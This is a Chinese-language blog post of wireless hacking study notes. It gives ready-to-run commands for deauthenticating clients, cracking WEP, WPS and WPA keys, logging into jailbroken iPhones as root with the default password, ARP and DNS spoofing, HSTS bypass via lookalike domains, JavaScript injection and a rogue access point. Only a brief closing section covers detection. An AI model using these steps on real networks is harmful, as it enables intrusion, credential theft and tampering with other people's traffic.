Network Hacking

Posted on 2020-02-03 | Edited on 2020-02-16

记录一下无线渗透的一些技术。

Pre Connection Attack

抓取数据包

  • 使用工具airodump-ng，packet sniffer（设备之间通过指定Mac Address通讯）

    • 设置monitor mode

      • iwconfig——查看有无线扩展的设备
      • ifconfig wlan0 down
      • airmon-ng check kill——结束无关进程
      • iwconfig wlan0 mode monitor
      • ifconfig wlan0 up

    • airodump-ng wlan0

      • 输出格式

    • 最普遍的wifi 频道

      • a——只用5Ghz的频率
      • b,g——都只用2.4Ghz
      • n——使用2.4Ghz和5Ghz
      • ac——使用6Ghz以下的频率
      • 例：如果只要搜寻5GHZ的——airodump-ng --band a wlan0
        • 2,4Ghz和5GHZ一起搜——airodump-ng --band abg wlan0

  • 抓取指定网络的数据包

    • airodump-ng --bssid 目标的bssid --channel 指定数字 --write test wlan0

      • 指定目标的Mac Address和频道，写入文件

    • 输出格式

    • 写入的文件名会自动加上-01，cap文件是最常用的

未授权攻击

  • 断开连接任何网路的任何客户端
  • 原理
    • 假装成客户端（修改Mac Address）给路由器发送断开请求
    • 再假装路由器给客户端发送断开请求
  • aireplay-ng --deauth 100000000 -a 网络的Mac地址 -c 客户端的MAC地址 wlan0
    • 100000000是指向客户端和路由器发送数据包的数量，数字越大，执行时间越长，网络断开时间越长
    • 注意：大部分情况下直接运行即可，但是极少数情况下如果airodump-ng没有在运行，可能会报错
  • 具体步骤
    • 先使用airodump-ng抓取数据包
      • airodump-ng --bssid 网络的Mac地址 --channel 指定频道 wlan0
      • 运行命令不要关闭
    • aireplay-ng --deauth 100000000 -a 网络的Mac地址 -c 客户端的MAC地址 wlan0

Gaining Access

WEP加密网络破解

  • 加密方式

    • 使用随机初试元素（IV）加密，但是IV只有24比特
    • 接收端使用IV+密钥生成密钥流

  • 弱点

    • IV太少，会重复，只要抓包分析就可以破解

  • 破解网络

    • 抓取数据包——使用airodump-ng
    • 分析数据包中的IVs，破解密钥——使用aircrack-ng

  • 具体步骤

    • airodump-ng --bssid 目标网络的Mac地址 --channel 频道 --write basic_wep wlan0
      • 可以持续运行（需要有足够的DATA，差不多十万左右）
    • aircrack-ng basic_wep-01.cap——得到密钥
      • 获取的密钥如果没有转换成ASCII，则将:删去直接写入这些数字连接

    假授权攻击

    • 适用情形：DATA增长得特别慢，目标网络不是繁忙的网络
    • 具体步骤
      • airodump-ng --bssid 目标网络的Mac地址 --channel 频道 --write aireplay wlan0
        • 持续运行
      • aireplay-ng --fakeauth 0 -a 目标网络的Mac地址 -h 无线接收器的Mac地址 wlan0
        • 0表示只攻击一次
        • 无线接收器的Mac地址
          • ifconfig，选择unspec中的前六个，用:分割
    • ARP请求攻击
      • aireplay-ng --aireplay -b 目标网络的Mac地址 -h 无线接收器的Mac地址 wlan0
        • 持续运行
      • aircrack-ng aireplay-01.cap

WPA、WPA2加密网络破解

  • 利用WPS接口破解

    • wash --interface wlan0

      • 看LCK，显示WPS是否开启

    • reaver --bssid 目标网络的Mac地址 --channel 数字 --interface wlan0 -vvv -no-associate

      • 暴力破解8位pin码
      • -vvv显示详细信息
    • 假认证攻击——aireplay-ng --fakeauth 30 -a 目标网络的Mac地址 -h 无线网卡的Mac地址 wlan0
      • 30表示每30秒向路由器发送请求

  • 抓取握手包

    • 使用airodump-ng获取周围网络信息
    • 使用airodump-ng获取指定网络的数据包
    • 等待握手包，可以断开指定用户的连接，然后用户重连时就可以获取握手包
      • aireplay-ng --deauth 4 -a 目标网络的Mac地址 -c 客户端的Mac地址 wlan0

  • 暴力破解

    • 创建自定义字典——crunch
      • crunch [min][max][characters] -+[pattern] -o[filename]
      • man crunch
    • aircrack-ng 数据包.cap -w 字典文件

  • 网络的设置界面往往在XX.XX.XX.1上

Post Connection Attack

  • 发现连接此网络的所有设备（无论有线或无线）
    • netdiscover -r IP范围
      • 例如netdiscover -r 192.168.1.1/24：表示扫描192.168.1.1~255的IP地址
    • 显示连接设备的IP、MAC地址等
  • Nmap/Zenmap
    • zenmap可以先使用Quick scan
    • Quick scan plus
    • Apple手机越狱之后会自动安装SSH Server，默认密码是alpine，所以如果发现连接网络的设备中有越狱的Apple手机，可以利用SSH远程执行命令
      • ssh root@IP
      • 输入密码alpine，如果成功的话会以root登录
  • MITM(Man In The Middle) Attacks
    • IP spoofing attack（IP欺骗攻击）
      • ARP Spoofing（ARP欺骗）
        • Address Resolution Protocol（地址解析协议）：Simple protocol used to map IP Address of a machine to its MAC address
          • ARP步骤：A设备发送ARP请求，包含指定IP地址—>具有这个IP地址的设备B发送返回包给A设备，包含自己的MAC地址—>A设备通过MAC地址与设备B交流
          • arp -a可查看arp表
          • 欺骗原理：对于受害者A，发送数据包，包含路由器R的IP地址，伪装成路由器R；对于路由器R，发送数据包，包含受害者A的IP地址，伪装成受害者A
          • ARP欺骗能实现的原因
            • 用户即使没有发送请求，还是可以接受响应包
            • 用户没有验证就直接相信响应包
        • 工具一——arpspoof
          • arpspoof -i 网卡名 -t 客户端IP 网口
            • 例如arpspoof -i wlan0 -t 192.168.2.7 192.168.2.1
          • arpspoof -i 网卡名 -t 客户端IP 网口
            • 例如arpspoof -i wlan0 -t 192.168.2.1 192.168.2.7
        • 受害者发送的请求包要能通过Kali渗透机到达路由器，必须启用port forwaiding
          • echo 1 > /proc/sys/net/ipv4/ip_forward
        • 工具二——bettercap
          • 安装
            • apt-get update
            • apt-get install bettercap
          • bettercap -iface 网卡名称
            • net.probe on——查看连接此网络的其他设备
            • 注意：开启net.probe后会自动开启net.recon，原因是当probe向所有可能的IP地址发送请求包之后，recon会接受响应包并构建合适的设备信息表，使用net.show查看
            • help arp.spoof
            • set arp.spoof.fullduplex true
            • set arp.spoof.targets 目标IP地址1,地址2...
            • arp.spoof on
              • 分析用户流量包——只对http有效，https需要绕过，因为https使用TLS(Transport Layer Security)或SSL(Secure Sockets Layer)加密
                • net.sniff on
                • bettercap会显示结果
            • 可以将上述指令全部存到一个文件中，保存为xxx.cap
              • bettercap -iface wlan0 -caplet xxx.cap
          • 绕过https，可以将它降级为http
            • bettercap的默认caplet的存储地址在/usr/share/bettercap/caplets
            • 在net.sniff on之前加上一句set net.sniff.local true
              • 即使数据包是本地的也会显示
            • bettercap -iface wlan0 -caplet /root/xxx.cap
            • caplets.show
            • hstshijack——github上的一个文件夹，可以实现降级，但不是所有网站都可以成功降为http
          • 绕过HSTS(HTTP Strict Transport Security)
            • 现代的浏览器都是硬编码，访问Https时只加载HSTS网站名单中的网站，即申请者知道自己访问的是https，只接收https的返回包，所以无法降级
            • 解决方案：欺骗浏览器加载另一个不同的网站（将链接更换成类似的链接）
              • 例：facebook.com改为facebook.corn
              • Twitter.com改为twiter.com
              • 如果用户直接输入网址，则无法绕过。如果使用谷歌搜索访问指定网页，则可以绕过。
      • DNS Spoofing Attack
        • 充当中间人返回指定站点的IP地址时，可以随意指定用户访问的网站的IP地址。因为当成功建立中间人的时候，用户会优先将网址发给中间人，而不是先发给DNS服务器
        • 还是使用bettercap
          • bettercap -iface wlan0 -caplet /root/xxx.cap
          • help dns.spoof根据帮助设置各个指标，默认会转化成网卡接口的IP地址
          • dns.spoof on
        • 删除之前的所有数据
        • https可以成功，hsts无法绕过，因为访问使用hsts的网站时，计算机不会发送你的请求，只会加载本地的网站列表，使用https访问
      • 注入JS代码
        • 将注入代码保存为xxx.js文件
        • hstshijack.cap相当于配置文件，设置payloads：,*:/root/xxx.js
        • 和之前一样使用bettercap：bettercap -iface wlan0 -caplet /root/xxx.cap
        • hstshijack/hstshijack
        • 加载任何网页的时候就会执行注入代码
  • Wireshark——只能检测通过自己接口的流量包
    • 在成为MITM以后便可以检测其他计算机的流量包
    • 如果想查看登录信息，可以查看POST请求
  • 创建伪造路由接口（成为MITM）——使用Mana-toolkit
    • 能联网的接口
    • 支持AP模式的无线接收器
    • Mana有3个主要的开始选项
      • start-noupstream.sh：创建假AP(Access Point)，没有联网
      • start-nat-simple.sh：创建假AP且联网（推荐）
      • start-nat-full.sh：创建假AP且联网，并且开始自动嗅探数据，绕过https
    • apt-get install mana-toolkit
    • leafpad /etc/mana-toolkit/hostapd-mana.conf修改配置文件
      • 将interface改为无线接收器的名称
    • leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
      • 将upstream改为联网的接口名称
      • 将phy改为无线接收器的名称
    • bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh（如果报错可再次运行一遍）
    • 另一虚拟机便可以连接到该假AP
  • 检测和防止ARP欺骗攻击
    • arp -a查看Mac地址是否发生变化
    • 或使用工具Xarp自动检测
    • 或使用Wireshark
      • preferences—protocols—ARP
      • analyze—Expert Information
    • 如果将arp -a中的Mac地址手动设置为static，则可以防止ARP欺骗，但是在大公司中如果有新的设备加入就要手动添加，会很麻烦
